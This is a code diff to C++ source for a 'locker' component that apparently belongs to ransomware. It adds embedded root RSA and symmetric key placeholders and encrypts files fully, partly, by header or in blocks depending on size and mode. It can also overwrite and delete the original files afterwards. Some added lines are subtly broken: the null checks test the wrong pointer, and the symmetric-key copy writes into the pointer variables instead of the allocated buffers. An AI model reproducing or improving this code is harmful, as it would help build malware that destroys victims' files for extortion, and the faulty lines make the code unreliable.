@@ -10,20 +10,40 @@
 
 
 // hash public key -> signature this hash with root private kay. verify signature with root public key
+
+// TODO: CRYPT KEYS
 VOID locker::LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size)
 {
-	CONST BYTE pub[] = "__public_key__"; // "\x06\x02\x00" Root RSA Public key / Type -print while gen keys
-	
+	BYTE pub[] = "__public_key__"; // "\x06\x02\x00" Root RSA Public key / Type -print while gen keys
+	*size = sizeof(pub);
 	*g_PublicKeyRoot = (BYTE*)memory::m_malloc(4096);
+	if (!g_PublicKeyRoot) return;
 	memcpy(*g_PublicKeyRoot, pub, *size);
+	memory::memzero_explicit((VOID*)pub, *size);
 }
 
 VOID locker::LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size)
 {
-	CONST BYTE prv[] = "__private_key__"; // "\x07\x02\x00" Root RSA Private key / Type -print while gen keys
+	BYTE prv[] = "__private_key__"; // "\x07\x02\x00" Root RSA Private key / Type -print while gen keys
 	*size = sizeof(prv);
 	*g_PrivateKeyRoot = (BYTE*)memory::m_malloc(4096);
+	if (!g_PrivateKeyRoot) return;
 	memcpy(*g_PrivateKeyRoot, prv, *size);
+	memory::memzero_explicit((VOID*)prv, *size);
+}
+
+VOID locker::LoadRootSymmetricKey(BYTE** g_RootKey, BYTE** g_RootIV)
+{
+	BYTE root_key[] = "____________ROOT_KEY____________";
+	BYTE root_iv[] = "ROOT__IV";
+	*g_RootKey = (BYTE*)memory::m_malloc(32);
+	*g_RootIV = (BYTE*)memory::m_malloc(8);
+	if (!g_RootKey || !g_RootIV)
+		return;
+	memcpy(g_RootKey, root_key, 32);
+	memcpy(g_RootIV, root_iv, 8);
+	memory::memzero_explicit((VOID*)root_key, sizeof(root_key));
+	memory::memzero_explicit((VOID*)root_iv, sizeof(root_iv));
 }
 
 STATIC VOID PrintHex(const BYTE* data, DWORD size)
@@ -130,6 +150,17 @@ BOOL locker::HandlerASymmetricGenKey()
 }
 
 
+STATIC BOOL SecureDelete(WCHAR* Path)
+{
+	HANDLE Handle = CreateFileW(Path, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+	if (Handle == INVALID_HANDLE_VALUE)
+		return FALSE;
+	SetFilePointer(Handle, 0, NULL, FILE_BEGIN);
+	SetEndOfFile(Handle);
+	CloseHandle(Handle);
+	DeleteFileW(Path);
+	return TRUE;
+}
 
 BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs, SLIST<HLIST>* HashList)
 {	
@@ -143,7 +174,8 @@ BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs
 	
 	if (global::GetEncrypt() == SYMMETRIC)
 	{
-		locker::FILE_INFO FileInfo;		
+		BOOL success = TRUE;
+		locker::FILE_INFO FileInfo;
 		FileInfo.FilePath = FPAth;
 		FileInfo.Filename = Filename;
 		HandlerSymmetricGenKey(&FileInfo, global::GetKey(), global::GetIV());		
@@ -156,7 +188,7 @@ BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs
 					if (!filesystem::EncryptFileFullData(&FileInfo, newFilename))
 					{
 						printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", Filename, GetLastError());
-						goto END;
+						success = FALSE;
 					}					
 				}
 				else if (FileInfo.Filesize <= 5242880)
@@ -164,7 +196,7 @@ BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs
 					if (!filesystem::EncryptFilePartly(&FileInfo, newFilename, 20))
 					{
 						printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", Filename, GetLastError());
-						goto END;
+						success = FALSE;
 					}					
 				}
 				else
@@ -172,8 +204,8 @@ BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs
 					if (!filesystem::EncryptFileHeader(&FileInfo, newFilename))
 					{
 						printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", Filename, GetLastError());
-						goto END;
-					}					
+						success = FALSE;
+					}
 				}
 			}
 			else if (global::GetEncMode() == FULL_ENCRYPT)
@@ -181,33 +213,32 @@ BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs
 				if (!filesystem::EncryptFileFullData(&FileInfo, newFilename))
 				{
 					printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", Filename, GetLastError());
-					goto END;
-				}				
+					success = FALSE;
+				}
 			}
 			else if (global::GetEncMode() == PARTLY_ENCRYPT)
 			{
 				if (!filesystem::EncryptFilePartly(&FileInfo, newFilename, 20))
 				{
 					printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", Filename, GetLastError());
-					goto END;
-				}				
+					success = FALSE;
+				}
 			}
 			else if (global::GetEncMode() == HEADER_ENCRYPT)
 			{
-
 				if (!filesystem::EncryptFileHeader(&FileInfo, newFilename))
 				{
 					printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", Filename, GetLastError());	
-					goto END;
-				}				
+					success = FALSE;
+				}
 			}
 			else if (global::GetEncMode() == BLOCK_ENCRYPT)
 			{
 				if (!filesystem::EncryptFileBlock(&FileInfo, newFilename))
 				{
 					printf_s("Failed %ls to EncryptFileBlock. GetLastError = %lu.\n", Filename, GetLastError());
-					goto END;
-				}				
+					success = FALSE;
+				}
 			}
 			else if (global::GetStatus())
 			{
@@ -217,8 +248,15 @@ BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs
 		else
 		{
 			printf_s("Failed ParseFile %ls. GetLastError = %lu. \n", Filename, GetLastError());
+			success = FALSE;
 		}
+		if (FileInfo.FileHandle && FileInfo.FileHandle != INVALID_HANDLE_VALUE)
+			CloseHandle(FileInfo.FileHandle);
+		if (FileInfo.newFileHandle && FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
+			CloseHandle(FileInfo.newFileHandle);
 		RtlSecureZeroMemory(&FileInfo, sizeof(FileInfo));		
+		if (!success)
+			goto END;
 	}
 	else if (global::GetEncrypt() == ASYMMETRIC)	
 	{
@@ -254,8 +292,17 @@ BOOL locker::HandlerCrypt(WCHAR* Filename, WCHAR* FPAth, WCHAR* Path, WCHAR* Exs
 			printf_s("Failed HashSignatureFile\n");
 	}
 
+	if (global::GetStatusOverWrite())
+	{
+		if (!filesystem::OverWriteFile(FPAth))
+			printf("Failed OverWriteFile.\n");
+	}
+
 	if (global::GetFlagDelete())
-		DeleteFileW(FPAth);
+	{
+		if (!SecureDelete(FPAth))
+			printf("Failed Delete File. GetLastError = %lu\n", GetLastError());
+	}
 
 END:
 	memory::m_free(newFilename);
